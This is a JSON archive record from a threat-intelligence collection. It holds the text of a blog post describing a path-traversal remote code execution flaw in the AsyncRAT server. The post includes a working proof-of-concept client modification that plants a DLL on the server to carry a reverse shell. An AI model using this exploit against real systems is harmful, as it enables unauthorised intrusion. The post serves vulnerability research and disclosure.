@@ -1,0 +1,42 @@
+{
+    "id": "a75399e8-e8d5-4ceb-808f-d49fd9e2073e",
+    "created_at": "2023-01-12T15:00:29.324265Z",
+    "updated_at": "2025-03-27T02:05:35.006584Z",
+    "deleted_at": null,
+    "sha1_hash": "3feace75327f3be9f87b4428718105a4103e0bdf",
+    "title": "2022-03-12 - AsyncRAT RCE vulnerability",
+    "authors": "",
+    "file_creation_date": "2022-05-28T19:49:33Z",
+    "file_modification_date": "2022-05-28T19:49:33Z",
+    "file_size": 368688,
+    "plain_text": "# AsyncRAT RCE vulnerability\n\n**brianstadnicki.github.io/posts/vulnerability-asyncrat-rce/**\n\nBrian Stadnicki March 12, 2022\n\n#### Brian Stadnicki included in vulnerability 2022-03-12 561 words  3 minutes\n\n AsyncRAT is an open source RAT (Remote Access Tool). While it isn’t typically used for advanced attacks, it’s very common in gaming scenes, thanks to how easy to use and surprisingly polished it is. Thankfully, there exists a RCE flaw.\n\n## Attack surface\n\n#### The AsyncRAT server listens by default on 6606, 7707 and 8808. No authentication is required to connect to a server, with commands being sent over a tcp ssl socket connection, with a custom msgpack implementation and gzip stream compression.\n\n There are many commands, but since this is written in C#, the easiest attack vector is to sideload a DLL, so the commands of interest write a file.\n\n## Command: socketDownload/save\n\n\n-----\n\n```\n string dwid unpack_msgpack.ForcePathObject( DWID ).AsString;\nFormDownloadFile SD = (FormDownloadFile)Application.OpenForms[\"socketDownload:\" +\ndwid];\nif (SD != null)\n{\n  if (!Directory.Exists(SD.DirPath))\n    return;\n  string fileName = unpack_msgpack.ForcePathObject(\"Name\").AsString;\n  string dirPath = SD.DirPath;\n  if (File.Exists(dirPath + \"\\\\\" + fileName))\n  {\n    fileName = DateTime.Now.ToString(\"MM-dd-yyyy HH;mm;ss\") + \"_\" + fileName;\n    await Task.Delay(100);\n  }\n  await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject(\"File\"),\ndirPath + \"\\\\\" + fileName));\n  SD.Close();\n}\n\n#### As we can see, the file is saved to the form’s download directory appended with the file name. As there is no sanitisation for the file name, it is vulnerable to a path traversal attack. The vulnerability is limited by the form check, which results in the vulnerability only working when the attacker is downloading a file. This means that during a file download, the server is vulnerable.\n\n For the purposes of this proof of concept, I will exploit it when the client has a file requested. It would be possible to keep sending a command to exploit this, especially because the connected client doesn’t show in the list view or logs until the client sends identification information.\n\n## Exploitation\n\n### DLL-sideload\n\n#### In order to exploit a dll-sideloading vulnerability, I need to identify a DLL to replace. I choose\ncGeoIp.dll, which appears to be used for geolocation of clients from their IP addresses.\n\n This DLL is also effective because it is loaded when the server is started.\n\n The DLL is included in the project’s resources, so I edit in a C# reverse shell using dnSpy.\n\n### Client modification\n\n#### For the exploitation itself, instead of writing a custom client for AsyncRAT, I found it easier to edit the client itself. Especially because my POC exploits the attacker trying to download a file, so keeping all the features helps convince the attacker to continue exploring the client and trigger the vulnerability.\n\n```\n\n-----\n\n```\nprivate bool infected false;\npublic void DownnloadFile(string file, string dwid)\n{\n  TempSocket tempSocket = new TempSocket();\n  try\n  {\n    if (!infected)\n    {\n      infected = true;\n      MsgPack msgpack = new MsgPack();\n      msgpack.ForcePathObject(\"Packet\").AsString = \"socketDownload\";\n      msgpack.ForcePathObject(\"Hwid\").AsString = Connection.Hwid;\n      msgpack.ForcePathObject(\"Command\").AsString = \"pre\";\n      msgpack.ForcePathObject(\"DWID\").AsString = dwid;\n      msgpack.ForcePathObject(\"File\").AsString = \"../../cGeoIp.dll\";\n      msgpack.ForcePathObject(\"Size\").AsString = new\nFileInfo(\"cGeoIp.dll\").Length.ToString();\n      tempSocket.Send(msgpack.Encode2Bytes());\n      MsgPack msgpack2 = new MsgPack();\n      msgpack2.ForcePathObject(\"Packet\").AsString = \"socketDownload\";\n      msgpack.ForcePathObject(\"Hwid\").AsString = Connection.Hwid;\n      msgpack2.ForcePathObject(\"Command\").AsString = \"save\";\n      msgpack2.ForcePathObject(\"DWID\").AsString = dwid;\n      msgpack2.ForcePathObject(\"Name\").AsString = \"../../cGeoIp.dll\";\n      msgpack2.ForcePathObject(\"File\").LoadFileAsBytes(\"cGeoIp.dll\");\n      tempSocket.Send(msgpack2.Encode2Bytes());\n    }\n    MsgPack msgpack = new MsgPack();\n    msgpack.ForcePathObject(\"Packet\").AsString = \"socketDownload\";\n    msgpack.ForcePathObject(\"Hwid\").AsString = Connection.Hwid;\n    msgpack.ForcePathObject(\"Command\").AsString = \"pre\";\n    msgpack.ForcePathObject(\"DWID\").AsString = dwid;\n    msgpack.ForcePathObject(\"File\").AsString = file;\n    msgpack.ForcePathObject(\"Size\").AsString = new\nFileInfo(file).Length.ToString();\n    tempSocket.Send(msgpack.Encode2Bytes());\n    MsgPack msgpack2 = new MsgPack();\n    msgpack2.ForcePathObject(\"Packet\").AsString = \"socketDownload\";\n    msgpack.ForcePathObject(\"Hwid\").AsString = Connection.Hwid;\n    msgpack2.ForcePathObject(\"Command\").AsString = \"save\";\n    msgpack2.ForcePathObject(\"DWID\").AsString = dwid;\n    msgpack2.ForcePathObject(\"Name\").AsString = Path.GetFileName(file);\n    msgpack2.ForcePathObject(\"File\").LoadFileAsBytes(file);\n    tempSocket.Send(msgpack2.Encode2Bytes());\n  }\n  catch\n  {\n    tempSocket?.Dispose();\n    return;\n\n```\n\n-----\n\n```\n  }\n}\n\n#### The AsyncRAT client has the modified cGeoIp.dll in the same directory. In order to not raise suspicions, the requested file is also sent, as the server doesn’t keep track of state.\n\n## Demo\n\n```\nWatch Video At:\n\nhttps://youtu.be/PybRvNi2pKk\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-12 - AsyncRAT RCE vulnerability.pdf"
+    ],
+    "report_names": [
+        "2022-03-12 - AsyncRAT RCE vulnerability.pdf"
+    ],
+    "threat_actors": [],
+    "ts_created_at": 1673535629,
+    "ts_updated_at": 1743041135,
+    "ts_creation_date": 1653767373,
+    "ts_modification_date": 1653767373,
+    "files": {
+        "pdf": "https://archive.orkl.eu/3feace75327f3be9f87b4428718105a4103e0bdf.pdf",
+        "text": "https://archive.orkl.eu/3feace75327f3be9f87b4428718105a4103e0bdf.txt",
+        "img": "https://archive.orkl.eu/3feace75327f3be9f87b4428718105a4103e0bdf.jpg"
+    }
+}
